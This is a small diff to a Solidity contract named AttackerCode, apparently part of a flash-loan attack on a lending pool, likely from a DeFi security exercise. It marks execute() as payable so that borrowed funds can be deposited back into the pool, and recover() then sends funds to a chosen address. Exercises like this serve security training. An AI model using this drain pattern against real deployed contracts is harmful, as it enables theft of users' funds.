@@ -10,7 +10,7 @@ contract AttackerCode {
         pool = _pool;
         pool.flashLoan(amount);
     }
-    function execute() public {
+    function execute() public payable{
         pool.deposit{value: msg.value}();
     }
     function recover(address recovery, uint256 amount) public {
